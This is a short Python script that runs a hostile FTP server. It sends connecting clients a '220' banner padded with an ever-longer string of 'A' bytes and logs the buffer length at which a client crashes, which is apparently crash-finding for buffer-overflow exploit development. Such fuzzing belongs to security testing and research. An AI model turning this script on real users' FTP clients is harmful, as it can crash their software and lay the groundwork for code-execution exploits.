import socket

buffer_length = 900
host = "0.0.0.0"
port = 21

def sendBanner(bufferInput, conn):
    prefix = bytearray("220 ".encode("ascii"))
    suffix = bytearray("\r\n".encode("ascii"))

    exploitInput = prefix + bufferInput + suffix
    conn.send(exploitInput)
    


def startServer(host, port, buffer_length):
    print("[+] Server Starting...")
    ssocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ssocket.bind((host, port))
    ssocket.listen()

    while True:
        conn, _ = ssocket.accept()
        bufferInput = bytearray(b"A" * buffer_length)
        print(f"[+] Sending buffer of length: {buffer_length}")
        sendBanner(bufferInput, conn)
        try:
            resp = (conn.recv(1024)).decode("ascii")
            print(f"[+] Response: {resp}", end="")
        except:
            print(f"[+] Application Crashed! Buffer Length: {buffer_length}")
            exit()
        buffer_length += 100
        conn.close()
    

startServer(host, port, buffer_length)

    


